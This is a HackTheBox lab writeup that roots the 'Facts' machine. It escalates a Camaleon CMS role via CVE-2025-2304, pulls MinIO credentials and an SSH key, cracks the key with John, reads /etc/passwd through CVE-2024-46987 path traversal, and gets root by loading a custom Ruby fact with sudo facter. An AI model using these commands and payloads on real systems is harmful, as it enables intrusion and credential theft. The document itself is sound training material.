# Facts — HackTheBox Writeup

> **Difficulty:** Easy  
> **OS:** Linux (Ubuntu 25.04)  
> **Category:** Web, Privilege Escalation  
> **CVEs Involved:** CVE-2025-2304, CVE-2024-46987

---

## 📋 Overview

The **Facts** machine hosts an installation of **Camaleon CMS 2.9.0** affected by two critical vulnerabilities:
- **CVE-2025-2304** — Authenticated Privilege Escalation via Mass Assignment
- **CVE-2024-46987** — Arbitrary Path Traversal for reading arbitrary files

Initial access is achieved by extracting AWS credentials from the CMS and using them to access a **MinIO** bucket containing a private SSH key. Cracking the key's passphrase allows SSH login as an unprivileged user. Root privilege escalation is performed by abusing the `facter` binary, which can be executed via `sudo` without a password.

---

## 🔍 Phase 1 — Enumeration

### Port Scan

During the enumeration phase, two relevant ports are identified:

| Port | Service | Notes |
|------|---------|-------|
| 80/tcp | HTTP (Camaleon CMS) | Admin panel |
| 54321/tcp | HTTP (MinIO / S3-compatible) | Internal object storage |

Port `54321` returns significant headers:

```
Content-Type: application/xml
<Error><Code>InvalidRequest</Code>...
X-Amz-Request-Id
X-Amz-Id-2
```

> The `Amz` prefixes and S3-style XML response confirm this is a **MinIO** service — an Amazon S3-compatible object storage server. The redirect to `http://facts.htb:9001` also reveals a separate MinIO web console.

**Identified architecture:**
```
[ Camaleon CMS :80 ] ──→ [ MinIO Storage :54321 ]
                                    ↕
                         [ MinIO Console :9001 ]
```

---

## 🌐 Phase 2 — CMS Initial Access

### Registration and Login

The `/admin` endpoint exposes a login panel that also **allows open registration**. A standard user account is created:
<p align="center">
  <img src="https://raw.githubusercontent.com/Elm4lek/Writeups/main/img/image-3.png" width="500">
</p>
- **Username:** `bob`  
- **Password:** `bob`

After logging in, the **Camaleon CMS version 2.9.0** admin panel is accessible.
<p align="center">
  <img src="https://raw.githubusercontent.com/Elm4lek/Writeups/main/img/image-4.png" width="500">
</p>

---

## ⚠️ Phase 3 — CVE-2025-2304: Privilege Escalation (Mass Assignment)

### Vulnerability Details

| Field | Detail |
|-------|--------|
| **CVE** | CVE-2025-2304 |
| **Type** | Mass Assignment / Privilege Escalation |
| **Authentication** | Required (standard user) |
| **CVSS v3.0** | 8.8 (High) |
| **CVSS v4.0** | 9.4 (Critical) |

**Root Cause:** The `updated_ajax` method in `UsersController` uses `permit!` without any parameter filtering. This allows an attacker to submit arbitrary fields — such as `role` — during a password change request, modifying their user role without authorization.

**Impact:** A user with the `client` role can escalate to `admin` with a single crafted HTTP request.

### Exploitation

The public exploit available on GitHub is used:  
🔗 [CVE-2025-2304 exploit.py](https://github.com/Alien0ne/CVE-2025-2304/blob/main/exploit.py)

**Step 1 — Escalate role to `admin`:**

```sh
└─$ python exploit.py -u http://facts.htb -U bob -P bob --newpass bob123

[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
   User ID: 5
   Current User Role: client
[+] Loading PRIVILEGE ESCALATION
   User ID: 5
   Updated User Role: admin
[+] Reverting User Role
```

**Step 2 — Extract S3/MinIO credentials:**

The exploit includes a `-e` flag to extract AWS credentials stored in the CMS settings:

```sh
└─$ python exploit.py -u http://facts.htb -U bob -P bob123 -e

[+] Camaleon CMS Version 2.9.0 PRIVILEGE ESCALATION (Authenticated)
[+] Login confirmed
   User ID: 5
   Current User Role: admin
[+] Extracting S3 Credentials
   s3 access key: AKIA7D2CD003BA5877FA
   s3 secret key: BlrFaANgPifpFKoDgKYdjuRb8s0MKI0IrDlDq7Y2
   s3 endpoint: http://localhost:54321
[+] Reverting User Role
```

> 💡 The same credentials can also be found manually in the **CMS Settings** (filesystem settings section in general settings http://facts.htb/admin/settings/site), without the exploit.

---

## 🪣 Phase 4 — MinIO Access and SSH Key Retrieval

### AWS CLI Configuration

The extracted credentials are configured in the AWS CLI to interact with the MinIO server:

```sh
aws configure
# AWS Access Key ID:     AKIA7D2CD003BA5877FA
# AWS Secret Access Key: BlrFaANgPifpFKoDgKYdjuRb8s0MKI0IrDlDq7Y2
# Default region name:   us-east-1
# Default output format: (leave blank)
```

### Listing Buckets

```sh
└─$ aws --endpoint-url http://facts.htb:54321 s3 ls

2025-09-11 08:06:52 internal
2025-09-11 08:06:52 randomfacts
```

Two buckets found: `internal` (interesting) and `randomfacts` (public site images).

### Exploring the `internal` Bucket

```sh
└─$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal

PRE .bundle/
PRE .cache/
PRE .ssh/
    .bash_logout
    .bashrc
    .lesshst
    .profile
```

> ⚠️ The `internal` bucket appears to be a **user's home directory exposed as an S3 bucket**. The `.ssh/` folder is particularly interesting.

### Downloading the Private SSH Key

```sh
└─$ aws --endpoint-url http://facts.htb:54321 s3 ls s3://internal/.ssh/

2026-04-30 05:46:19    82  authorized_keys
2026-04-30 05:46:19   464  id_ed25519
```

```sh
# Download the private key
aws --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .

# Set correct permissions (required for SSH)
chmod 600 id_ed25519
```

---

## 👤 Phase 5 — User Enumeration via CVE-2024-46987

### Vulnerability Details

| Field | Detail |
|-------|--------|
| **CVE** | CVE-2024-46987 |
| **Type** | Arbitrary Path Traversal (authenticated) |
| **Endpoint** | `/admin/media/download_private_file` |

The `file` parameter is not validated, allowing filesystem traversal using `../` sequences.

### Reading `/etc/passwd`

```
http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd
```

```sh
└─$ cat passwd | grep /bin/bash

root:x:0:0:root:/root:/bin/bash
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

**Users identified:** `root`, `trivia`, `william`

---

## 🔐 Phase 6 — SSH Access and Passphrase Cracking

### Initial SSH Attempt

The `id_ed25519` key found in the `internal` bucket belongs to user `trivia` (whose home directory was exposed as a bucket). However, the key is passphrase-protected:

```sh
└─$ ssh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519':
```

### Cracking with John the Ripper

**Step 1 — Convert the key to a crackable hash format:**
```sh
ssh2john id_ed25519 > hash.txt
```

**Step 2 — Dictionary attack with rockyou:**
```sh
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher) is 2 (Bcrypt/AES) for all loaded hashes
Cost 2 (iteration count) is 24 for all loaded hashes
Will run 6 OpenMP threads

dragonballz      (id_ed25519)
1g 0:00:01:50 DONE  0.009026g/s  29.03p/s
Session completed.
```

> ✅ **Passphrase found:** `dragonballz`

### Successful SSH Login

```sh
└─$ ssh -i id_ed25519 trivia@facts.htb
Enter passphrase for key 'id_ed25519': dragonballz

Welcome to Ubuntu 25.04 (GNU/Linux 6.14.0-37-generic x86_64)
...
trivia@facts:~$
```

---

## 🚩 User Flag

```sh
trivia@facts:/home$ cd william/
trivia@facts:/home/william$ cat user.txt

cd8d5***************************
```

> **Alternative via Path Traversal (no SSH needed):**  
> `http://facts.htb/admin/media/download_private_file?file=../../../../../../home/william/user.txt`

<p align="center">
  <img src="https://raw.githubusercontent.com/Elm4lek/Writeups/main/img/image-1.png" width="500">
</p>

---

## 🔺 Phase 7 — Privilege Escalation to Root (Facter Abuse)

### Local Enumeration

```sh
trivia@facts:/home$ id
uid=1000(trivia) gid=1000(trivia) groups=1000(trivia)

trivia@facts:/home$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin,
    use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

> User `trivia` can run `/usr/bin/facter` as `root` **without a password**.

### What is Facter?

`facter` is a Ruby-based system information collection tool used by Puppet. It supports **custom facts** — Ruby scripts loaded from user-specified directories via `--custom-dir`. Since the process runs as root, any code inside those scripts executes with root privileges.

```sh
trivia@facts:/usr/bin$ cat facter
#!/usr/bin/ruby
# frozen_string_literal: true

require 'pathname'
require 'facter/framework/cli/cli_launcher'

Facter::OptionsValidator.validate(ARGV)
processed_arguments = CliLauncher.prepare_arguments(ARGV)
CliLauncher.start(processed_arguments)
```

<p align="center">
  <img src="https://raw.githubusercontent.com/Elm4lek/Writeups/main/img/image-2.png" width="500">
</p>

### Exploit — Ruby RCE via Custom Fact

The `--custom-dir` flag allows specifying a directory from which arbitrary Ruby scripts are loaded. Since `facter` runs as `root`, any code in those scripts is executed with root privileges.

```sh
# Step 1: create a malicious Ruby script in /tmp
trivia@facts:/usr/bin$ echo 'exec "/bin/bash"' > /tmp/x.rb

# Step 2: run facter with sudo, pointing to /tmp as custom-dir
trivia@facts:/usr/bin$ sudo facter --custom-dir=/tmp x
```

```sh
root@facts:/usr/bin#
```

> ✅ **Root shell obtained!**

---

## 🚩 Root Flag

```sh
root@facts:/usr/bin# cd /root/
root@facts:~# ls
minio-binaries  ministack  root.txt  snap

root@facts:~# cat root.txt
cfcf8***************************
```

---

## 📊 Attack Summary

```
[Register account on CMS]
        ↓
[CVE-2025-2304: Escalate CMS role to admin]
        ↓
[Extract AWS/MinIO credentials from CMS settings]
        ↓
[Access MinIO bucket → retrieve id_ed25519 private SSH key]
        ↓
[CVE-2024-46987: Path Traversal → /etc/passwd → identify users]
        ↓
[John the Ripper → crack SSH passphrase: dragonballz]
        ↓
[SSH login as trivia → User Flag]
        ↓
[sudo facter --custom-dir=/tmp → RCE as root]
        ↓
[Root Flag]
```

---

## 🛠️ Tools Used

| Tool                         | Purpose                                           |
| ---------------------------- | ------------------------------------------------- |
| `nmap`                       | Port and service enumeration                      |
| `exploit.py` (CVE-2025-2304) | CMS privilege escalation + credential extraction  |
| `aws cli`                    | MinIO interaction (S3-compatible)                  |
| `ssh2john`                   | Convert SSH key to crackable hash                 |
| `john`                       | SSH passphrase cracking                           |
| `facter`                     | Privilege escalation to root                      |

---
## 📚 Lessons Learned  
  
- Misconfigured storage backends can expose critical data  
- Web vulnerabilities often lead to full system compromise  
- Ruby tools in sudo are common vectors for privilege escalation
